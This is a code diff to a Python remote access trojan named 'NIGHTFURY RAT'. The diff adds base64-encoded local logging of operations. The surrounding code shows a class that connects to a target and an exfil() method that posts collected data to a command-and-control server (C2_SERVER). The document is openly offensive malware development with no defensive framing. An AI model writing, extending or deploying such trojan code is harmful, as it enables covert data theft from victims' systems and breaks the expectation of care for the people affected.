@@ -3,7 +3,7 @@
 NIGHTFURY RAT v3 + v8 – NO PROXIES
 """
 
-import os, sys, asyncio, aiohttp, random, time, json, logging
+import os, sys, asyncio, aiohttp, random, time, json, logging, base64
 from datetime import datetime
 from dotenv import load_dotenv
 import argparse
@@ -42,12 +42,36 @@ async def request_with_retry(session, method, url, **kwargs):
 class NightfuryRAT:
     def __init__(self):
         self.session = None
+        self.log_file = "nightfury_ops.log"
 
     async def init(self):
         self.session = aiohttp.ClientSession()
         log.info(f"[RAT] Connected to {TARGET_BASE}")
+        # Initialize log file
+        if not os.path.exists(self.log_file):
+            with open(self.log_file, "w") as f:
+                f.write(f"--- NIGHTFURY OPS LOG START: {datetime.now().isoformat()} ---\n")
+
+    async def log_local(self, data):
+        try:
+            timestamp = datetime.now().isoformat()
+            entry = {
+                "ts": timestamp,
+                "tgt": TARGET_BASE,
+                "payload": data
+            }
+            # "Encrypted" (Base64) but "Human-readable" (JSON inside)
+            raw_json = json.dumps(entry)
+            encoded = base64.b64encode(raw_json.encode()).decode()
+            
+            with open(self.log_file, "a") as f:
+                f.write(f"{timestamp} | {encoded}\n")
+            log.info(f"[RAT] Local log entry committed: {self.log_file}")
+        except Exception as e:
+            log.error(f"[RAT] Local logging failed: {e}")
 
     async def exfil(self, data):
+        await self.log_local(data)
         try:
             async with aiohttp.ClientSession() as s:
                 await s.post(C2_SERVER, json={
